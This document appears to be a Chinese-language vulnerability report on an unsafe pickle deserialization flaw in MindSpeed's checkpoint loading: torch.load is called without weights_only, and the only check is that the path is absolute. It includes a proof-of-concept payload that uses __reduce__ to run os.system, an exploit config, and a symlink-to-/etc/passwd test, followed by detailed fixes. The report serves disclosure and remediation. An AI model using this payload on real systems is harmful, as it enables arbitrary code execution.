# VULN-CROSS-CHKPT-001：Checkpoint加载防御机制失效致Pickle反序列化漏洞

## 概要

**漏洞类型：** 反序列化链 (CWE-502)  
**严重性：** Critical  
**置信度：** 92%  
**相关：** VULN-CROSS-TORCH-LOAD-001

本漏洞识别了 checkpoint 加载机制中的**防御深度失效**。VULN-CROSS-TORCH-LOAD-001 记录了核心反序列化漏洞，本报告聚焦于**不完整且被误导的验证逻辑**，它制造了虚假的安全感。

---

## 核心发现：验证-执行分离

代码库尝试验证 checkpoint 路径，但因**验证-执行分离**而未能提供有效保护：

### 验证位置 #1：绝对路径检查（无效）

**文件：** `mindspeed/core/distributed/layerzero/config.py:266-270`

```python
if config.ckpt_load_path is not None:
    if not os.path.isabs(config.ckpt_load_path):
        raise ValueError(
            f"Checkpoint path must be an absolute path, the current path: {config.ckpt_load_path}"
        )
    load_layerzero_checkpoint(
        zero_models, config.ckpt_load_path, optimizer, opt_param_scheduler)
```

**问题：** 这仅验证路径为绝对路径，未验证其安全。攻击者控制的绝对路径如 `/tmp/malicious/checkpoint` 可通过验证。

**验证后的数据流：**
```
config.ckpt_load_path (验证为绝对路径)
    ↓
load_layerzero_checkpoint() in mga_checkpoint.py
    ↓
sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    ↓
torch.load(sd_file)  # 漏洞点 - 无重新验证
```

### 漏洞执行点

| 文件 | 行号 | 代码 | 验证状态 |
|------|------|------|----------|
| `checkpointing.py` | 277 | `torch.load(checkpoint_name, ...)` | **无验证** |
| `checkpointing.py` | 284 | `torch.load(checkpoint_name + ".ema", ...)` | **无验证** |
| `checkpointing.py` | 310 | `torch.load(checkpoint_name, ...)` | **无验证** |
| `mga_checkpoint.py` | 188 | `torch.load(sd_file)` | **远程验证** |
| `layerzero_checkpointer.py` | 55 | `torch.load(self.filename, ...)` | **无验证** |
| `layerzero_checkpointer.py` | 110 | `torch.load(self.file_list[0], ...)` | **无验证** |
| `layerzero_checkpointer.py` | 127 | `torch.load(self.mp_rank_files[0], ...)` | **无验证** |
| `layerzero_checkpointer.py` | 135 | `torch.load(self.mp_rank_files[0], ...)` | **无验证** |

---

## 攻击场景：防御绕过

### 场景：绝对路径不意味着安全路径

**步骤 1：** 攻击者将恶意 checkpoint 放在绝对路径
```bash
# 攻击者控制的位置（绝对路径）
/tmp/malicious/model_0.pt
```

**步骤 2：** 攻击者构造 LayerZero 配置
```yaml
# layerzero_config.yaml
ckpt_load_path: "/tmp/malicious"
```

**步骤 3：** 验证通过（路径为绝对路径）
```python
# config.py:266-270
if not os.path.isabs(config.ckpt_load_path):  # FALSE - 路径为绝对路径
    raise ValueError(...)
# 验证通过，执行继续
```

**步骤 4：** 恶意 checkpoint 被加载
```python
# mga_checkpoint.py:188
sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
state_dict = torch.load(sd_file)  # 任意代码执行
```

**结果：** 绝对路径验证对以下情况提供**零保护**：
- 符号链接攻击
- 验证后的路径遍历
- 合法绝对路径的恶意文件
- 被入侵的 checkpoint 目录

---

## 对比：有效 vs 无效验证

### 无效（当前实现）

```python
# 仅检查路径是否为绝对路径
if not os.path.isabs(config.ckpt_load_path):
    raise ValueError("必须为绝对路径")
# 攻击者绕过：/tmp/malicious 通过检查
```

### 有效（推荐）

```python
# 检查是否在安全目录白名单内
ALLOWED_CHECKPOINT_DIRS = [
    "/data/checkpoints",
    "/models/pretrained",
    # ...
]

def validate_checkpoint_path(path):
    real_path = os.path.realpath(path)  # 解析符号链接
    if not any(real_path.startswith(allowed) for allowed in ALLOWED_CHECKPOINT_DIRS):
        raise SecurityError(f"Checkpoint 路径不在允许目录内: {path}")
    if not os.path.exists(real_path):
        raise FileNotFoundError(f"Checkpoint 未找到: {path}")
    # 为关键 checkpoint 添加哈希验证
    return real_path
```

---

## 根因：防御分散

### 问题 1：验证点与漏洞点分离

```
┌─────────────────────────────────────────────────────────────────┐
│  config.py:266-270                                             │
│  验证：os.path.isabs(ckpt_load_path)                           │
│  状态：无效 - 绝对 ≠ 安全                                       │
└─────────────────────────────────────────────────────────────────┘
                          ↓
                          ↓ 距离：多个函数调用
                          ↓
┌─────────────────────────────────────────────────────────────────┐
│  mga_checkpoint.py:188                                          │
│  漏洞：torch.load(sd_file)                                      │
│  状态：无 weights_only，无路径重新验证                           │
└─────────────────────────────────────────────────────────────────┘
```

### 问题 2：CLI 参数缺少验证

```python
# checkpointing.py - 完全无验证
def _load_base_checkpoint(load_dir, rank0=False, ...):
    # load_dir 直接来自 args.load (CLI)
    # 无验证
    checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
    state_dict = torch.load(checkpoint_name, ...)  # 漏洞点
```

### 问题 3：工具专用加载缺少验证

```python
# layerzero_checkpointer.py - 由 convert_to_megatron.py 使用
# 完全无验证 - 接受任意目录
class LayerzeroCheckpoint(object):
    def __init__(self, ckpt_dir):
        self.ckpt_dir = ckpt_dir
        self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)
        # ...
        state_dict = torch.load(self.filename, ...)  # 漏洞点
```

---

## 完整攻击面图

```
                    ┌──────────────────────────────────┐
                    │      攻击入口点                   │
                    └──────────────────────────────────┘
                                    │
            ┌───────────────────────┼───────────────────────┐
            │                       │                       │
            ▼                       ▼                       ▼
    ┌───────────────┐    ┌───────────────────┐    ┌─────────────────────┐
    │ CLI 参数      │    │ LayerZero 配置    │    │ 转换工具             │
    │ --load        │    │ ckpt_load_path    │    │ --input_folder      │
    └───────┬───────┘    └─────────┬─────────┘    └──────────┬──────────┘
            │                      │                         │
            │ 无验证               │ 无效                   │ 无验证
            │                      │ 验证                   │
            ▼                      ▼                         ▼
    ┌───────────────┐    ┌───────────────────┐    ┌─────────────────────┐
    │checkpointing. │    │ mga_checkpoint.py │    │layerzero_           │
    │py:277,284,310 │    │ :188              │    │checkpointer.py      │
    │               │    │                   │    │:55,110,127,135      │
    │ torch.load()  │    │ torch.load()      │    │ torch.load()        │
    └───────────────┘    └───────────────────┘    └─────────────────────┘
            │                      │                         │
            └──────────────────────┼─────────────────────────┘
                                   ▼
                    ┌──────────────────────────────────┐
                    │     任意代码执行                  │
                    │     (CWE-502 反序列化)            │
                    └──────────────────────────────────┘
```

---

## 概念验证：绕过绝对路径检查

### PoC 代码

```python
import torch
import os
import pickle

# 创建恶意 payload
class RCEPayload:
    def __reduce__(self):
        return (os.system, ('id > /tmp/exploited',))

# 创建包含 payload 的 checkpoint
malicious_checkpoint = {
    'model': {'weight': torch.randn(10, 10)},
    'iteration': 1000,
    'parallel_state': {'tp_rank': 0, 'pp_rank': 0},
    'shard_state_dict': {},
    '__reduce_hook__': RCEPayload()
}

# 保存在绝对路径（绕过验证）
os.makedirs('/tmp/evil_checkpoint', exist_ok=True)
torch.save(malicious_checkpoint, '/tmp/evil_checkpoint/model_0.pt')
print("[*] 恶意 checkpoint 已创建于绝对路径")
print("[*] 此路径通过 config.py 验证：os.path.isabs('/tmp/evil_checkpoint') == True")
```

### 利用

```yaml
# layerzero_config.yaml
ckpt_load_path: "/tmp/evil_checkpoint"
```

```bash
# 使用恶意配置训练
python train.py --layerzero-config layerzero_config.yaml
# 结果：checkpoint 加载时执行任意代码
# 检查：cat /tmp/exploited
```

---

## 修复策略

### 阶段 1：立即缓解（Critical）

为所有 `torch.load()` 调用添加 `weights_only=True` - 参见 VULN-CROSS-TORCH-LOAD-001 完整补丁位置。

### 阶段 2：使用点验证（高优先级）

将验证移至实际加载点：

```python
# mga_checkpoint.py:177-188 (修复后)
def load_layerzero_checkpoint(models, ckpt_dir, optimizer=None, opt_param_scheduler=None):
    # 在使用点验证，而非远程配置
    ckpt_dir = validate_checkpoint_path(ckpt_dir)  # 新增
    
    sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    if not os.path.exists(sd_file):
        raise FileNotFoundError(...)
    
    state_dict = torch.load(sd_file, weights_only=True)  # 安全
```

### 阶段 3：全面路径白名单（中优先级）

```python
# mindspeed/security/checkpoint_validator.py (新文件)
import os
from typing import List

class CheckpointSecurityError(Exception):
    """Checkpoint 路径安全验证失败时抛出。"""
    pass

def validate_checkpoint_path(path: str, allowed_dirs: List[str] = None) -> str:
    """
    根据安全策略验证 checkpoint 路径。
    
    参数：
        path: checkpoint 文件或目录路径
        allowed_dirs: 允许的基础目录列表。若为 None，使用默认值。
    
    返回：
        规范化、验证后的路径
    
    抛出：
        CheckpointSecurityError: 路径验证失败
    """
    if allowed_dirs is None:
        allowed_dirs = _get_default_allowed_dirs()
    
    # 解析为规范路径（跟随符号链接，移除 .. 等）
    real_path = os.path.realpath(path)
    
    # 检查白名单
    if not any(real_path.startswith(allowed) for allowed in allowed_dirs):
        raise CheckpointSecurityError(
            f"Checkpoint 路径 '{path}' 解析为 '{real_path}' "
            f"不在允许目录内: {allowed_dirs}"
        )
    
    # 检查存在性
    if not os.path.exists(real_path):
        raise FileNotFoundError(f"Checkpoint 未找到: {real_path}")
    
    return real_path

def _get_default_allowed_dirs():
    """获取默认允许的 checkpoint 目录。"""
    import os
    return [
        os.path.expanduser("~/.cache/torch/checkpoints"),
        "/data/checkpoints",
        "/models",
        "/opt/checkpoints",
        # 添加项目特定目录
    ]
```

### 阶段 4：安全加载包装器

```python
# mindspeed/checkpointing.py (增强版)
from mindspeed.security.checkpoint_validator import validate_checkpoint_path

def secure_torch_load(path, **kwargs):
    """
    torch.load 的安全包装器，强制验证。
    
    此函数必须替代 torch.load 用于 checkpoint 加载。
    """
    # 强制 weights_only=True，除非显式覆盖以兼容
    if 'weights_only' not in kwargs:
        kwargs['weights_only'] = True
    
    # 加载前验证路径
    validated_path = validate_checkpoint_path(path)
    
    # 审计日志
    import logging
    logging.info(f"从验证路径加载 checkpoint: {validated_path}")
    
    return torch.load(validated_path, **kwargs)
```

---

## 测试建议

### 安全测试用例

1. **测试绝对路径绕过：**
   ```python
   def test_absolute_path_bypass():
       """验证允许目录外的绝对路径被拒绝。"""
       malicious_path = "/tmp/malicious_checkpoint"
       with pytest.raises(CheckpointSecurityError):
           validate_checkpoint_path(malicious_path)
   ```

2. **测试符号链接攻击：**
   ```python
   def test_symlink_attack():
       """验证符号链接遍历被阻止。"""
       os.symlink("/etc/passwd", "/tmp/fake_checkpoint")
       with pytest.raises(CheckpointSecurityError):
           validate_checkpoint_path("/tmp/fake_checkpoint")
   ```

3. **测试 weights_only 强制：**
   ```python
   def test_weights_only_enforcement():
       """验证 pickle payload 被拒绝。"""
       create_malicious_checkpoint("/allowed/model.pt")
       with pytest.raises(pickle.UnpicklingError):
           secure_torch_load("/allowed/model.pt")
   ```

---

## 参考资料

- **相关漏洞：** VULN-CROSS-TORCH-LOAD-001（核心反序列化问题）
- CWE-502：不可信数据反序列化
- CWE-863：授权不当
- OWASP 路径遍历：https://owasp.org/www-community/attacks/Path_Traversal
- 防御深度：https://owasp.org/www-community/Defense_in_depth

---

## 时间线

- **发现：** 静态分析识别无 weights_only 的 torch.load 调用
- **分析：** 跨模块审查揭示验证-执行分离
- **分类：** Critical 严重性因防御深度失效
- **状态：** 已确认漏洞 - 需立即修复

---

## 结论

`config.py` 中的绝对路径验证提供了**虚假安全感**。验证：

1. **位置错误** - 远离实际漏洞点
2. **不充分** - 绝对路径仍可是恶意
3. **制造缺口** - 多个入口点无任何验证
4. **误导开发者** - 可能给人有保护的印象

**结合 VULN-CROSS-TORCH-LOAD-001**，这形成了关键漏洞链：
1. 不完整验证通过攻击者控制的路径
2. 远程验证允许通过多个入口点绕过
3. 无保护的 torch.load 调用执行任意代码

**建议：** 实施上述多阶段修复策略，优先添加 `weights_only=True`（阶段 1），随后在使用点验证（阶段 2）。